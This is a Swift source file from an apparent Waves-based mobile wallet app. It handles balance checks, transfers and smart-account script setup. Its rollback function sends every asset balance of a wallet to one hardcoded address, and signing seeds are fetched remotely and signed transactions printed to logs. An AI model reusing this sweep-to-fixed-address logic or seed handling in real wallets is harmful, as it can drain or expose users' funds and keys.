//
//  Blockchain.swift
//  WavesSDKUI
//
//  Created by Hayrettin İletmiş on 6.07.2019.
//  Copyright © 2019 Waves. All rights reserved.
//

import UIKit
import WavesSDK
import WavesSDKCrypto
import WavesSDKExtensions
import RxSwift
import Locksmith
import Foundation


class Blockchain {
    
    
    private var balances: NodeService.DTO.AddressAssetsBalance?
    private var disposeBag: DisposeBag = DisposeBag()
    
    private let wavesCrypto: WavesCrypto = WavesCrypto()
    let digiliraPay = digiliraPayApi()
    
    func arrayWithSize(_ s: String) -> [UInt8] {
        let b: [UInt8] = Array(s.utf8)
        return toByteArray(Int16(b.count)) + b
    }
    
    
    
    func rollback (wallet: String) {
        
        self.checkAssetBalance(address: wallet){ (balances) in
            DispatchQueue.main.async {
                
                balances.balances.forEach { word in
                    print(word.assetId)
                    self.sendTransaction(
                        recipient: "3NCpyPuNzUaB7LFS4KBzwzWVnXmjur582oy",
                        fee: 900000,
                        amount: word.balance,
                        assetId: word.assetId,
                        attachment: "12345678"){(res) in
                            
                        }
                }
            }
        }
        

         
    }
    
    
    
    func sendTransaction(recipient: String, fee: Int64, amount:Int64, assetId:String, attachment:String, returnCompletion: @escaping (NodeService.DTO.Transaction) -> () ) {
         
        digiliraPay.getSeed() { (json) in
            DispatchQueue.main.async {
                
                if (json.seed != "") { //hatali dogrulama
                     
                    let chainId = WavesSDK.shared.enviroment.chainId!
                    let senderPublicKey = WavesCrypto.shared.publicKey(seed: json.seed!)!
                    
                    
                    let buf: [UInt8] = Array(attachment.utf8)
                    let attachment58 = WavesCrypto.shared.base58encode(input: buf)
                    
                    let feeAssetId = ""
                    
                    let timestamp = Int64(Date().timeIntervalSince1970) * 1000
                    
                    var queryModel = NodeService.Query.Transaction.Transfer(recipient: recipient,
                                                                            assetId: assetId,
                                                                            amount: amount,
                                                                            fee: fee,
                                                                            attachment: attachment58!,
                                                                            feeAssetId: feeAssetId,
                                                                            timestamp: timestamp,
                                                                            senderPublicKey: senderPublicKey, chainId: chainId)
                    queryModel.sign(seed: json.seed!)
                    
                    print(queryModel)
                    
                    let send = NodeService.Query.Transaction.transfer(queryModel)
                    
                    
                    WavesSDK.shared.services
                        .nodeServices // You can choose different Waves services: node, matcher and data service
                        .transactionNodeService // Here methods of service
                        .transactions(query: send)
                        .observeOn(MainScheduler.asyncInstance)
                        .subscribe(onNext: {(tx) in
                            returnCompletion(tx)
                        })
                        .disposed(by: self.disposeBag)
                    
                    //return queryModel.self.attachment
                     
                }
                 
            }
        }
          
    }
    
    
    func returnAsset (assetId: String) -> String {
        
        switch assetId {
        case "FjTB2DdymTfpYbCCdcFwoRbHQnEhQD11CUm6nAF7P1UD":
            return "Bitcoin"
        case "LVf3qaCtb9tieS1bHD8gg5XjWvqpBm5TaDxeSVcqPwn":
            return "Ethereum"
        case "49hWHwJcTwV7bq76NebfpEj8N4DpF8iYKDSAVHK9w9gF":
            return "Litecoin"
        case "HGoEZAsEQpbA3DJyV9J3X1JCTTBuwUB6PE19g1kUYXsH":
            return "Waves"
        default:
            return "null"
        }
        
    }
    
    
    func base58 (data:String) -> String{
        let attachment =  WavesCrypto.shared.base58decode(input: data)
        let string = String(bytes: attachment!, encoding: .utf8)
        return string ?? "empty"
    }
    
    func smartD() {
        

        let dictionary = Locksmith.loadDataForUserAccount(userAccount: "sensitive")
        let wallet = digilira.wallet.init(seed: dictionary?["seed"] as? String)
 
                guard let chainId = WavesSDK.shared.enviroment.chainId else { return }
        guard let senderPublicKey = WavesCrypto.shared.publicKey(seed: wallet.seed!) else { return }
                
                let fee: Int64 = 1400000
                let timestamp = Int64(Date().timeIntervalSince1970) * 1000
                
                var queryModel = NodeService.Query.Transaction.SetScript.init(chainId: chainId,
                                                                              fee: fee,
                                                                              timestamp: timestamp,
                                                                              senderPublicKey: senderPublicKey,
                                                                              script: digilira.smartAccount.script)
                
                
        queryModel.sign(seed: wallet.seed!)
                
                let send = NodeService.Query.Transaction.setScript(queryModel)
                
                WavesSDK.shared.services
                    .nodeServices
                    .transactionNodeService
                    .transactions(query: send)
                    .observeOn(MainScheduler.asyncInstance)
                    .subscribe(onNext: { [weak self] (tx) in
                        print(tx) // Do something on success, now we have wavesBalance.balance in satoshi in Long
                        
                    })
                
                
        
        
        
        
        
    }
    
    func retry(address: String) {
        
        checkBalance(address: address);
        
    }
    
    
    
    func checkBalance(address: String) {
        

                
                guard let chainId = WavesSDK.shared.enviroment.chainId else { return }
                //guard let address = WavesCrypto.shared.address(seed: json.seed!, chainId: chainId) else { return }
                
                
                WavesSDK.shared.services
                    .nodeServices
                    .addressesNodeService
                    .addressBalance(address: address)
                    .observeOn(MainScheduler.asyncInstance)
                    .subscribe(onNext: { [weak self] (balances) in
                        print(balances)
                        let BC = Blockchain()
                        
                        if balances.balance < 1400000 {
                            DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
                                print("retry")
                                BC.retry(address: address)
                            }
                        }else {
                            BC.smartD()
                        }
                    })
                 
            
        
         
    }
    
    
    func checkTransactions (address: String, returnCompletion: @escaping ([NodeService.DTO.Transaction]?) -> () ) {
        WavesSDK.shared.services.nodeServices.transactionNodeService
            .transactions(by: address, offset: 0, limit: 100)
            .observeOn(MainScheduler.asyncInstance)
            .subscribe({(history) in
                returnCompletion(history.element?.transactions)
            })
    }
    
    func   checkAssetBalance(address: String, returnCompletion: @escaping (NodeService.DTO.AddressAssetsBalance) -> () ) {
        WavesSDK.shared.services.nodeServices.assetsNodeService
            .assetsBalances(address: address)
            .observeOn(MainScheduler.asyncInstance)
            .subscribe(onNext: { (balances) in
                returnCompletion(balances)
            })
        
    }
    
    func checkSmart(address: String) {
        
        
        let url = URL(string:  digilira.node.url + "/addresses/scriptInfo/" + address)
        
        var request = URLRequest(url: url!)
        
        
        request.httpMethod = "GET"
        
        let session = URLSession.shared
        let task = session.dataTask(with: request, completionHandler: { data, response, error -> Void in
            do {
                let json = try JSONSerialization.jsonObject(with: data!) as! Dictionary<String, AnyObject>
                
                DispatchQueue.main.async { // Correct
                    
                    print(json)
                    
                    if json["complexity"] as! Int64 == 0 {
                        self.checkBalance(address: address)
                        
                    }else {
                        print("SMART ACCOUNT")
                    }
                    
                    
                }
            } catch {
                print("error")
            }
        })
        
        task.resume()
        
    }
    
    
    
    
    
    
    
    
}
